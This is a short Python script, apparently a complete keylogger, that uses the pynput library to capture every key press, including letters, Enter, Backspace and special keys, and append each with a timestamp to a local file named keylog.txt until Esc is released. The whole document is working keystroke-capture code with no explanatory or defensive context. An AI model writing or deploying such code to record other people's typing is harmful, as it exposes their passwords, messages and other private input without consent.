import pynput
from pynput.keyboard import Key, Listener
import datetime
log_file = "keylog.txt"
def log_key(key):
    with open(log_file, "a") as f:
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        f.write(f"{timestamp}: {key}\n")
def on_press(key):
    try:
        log_key(f'Key "{key.char}" pressed.')
    except AttributeError:
        if key == Key.space:
            log_key("Key [SPACE] pressed.")
        elif key == Key.enter:
            log_key("Key [ENTER] pressed.")
        elif key == Key.backspace:
            log_key("Key [BACKSPACE] pressed.")
        else:
            log_key(f"Key [{key.name.upper()}] pressed.")
def on_release(key):
    if key == Key.esc:
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
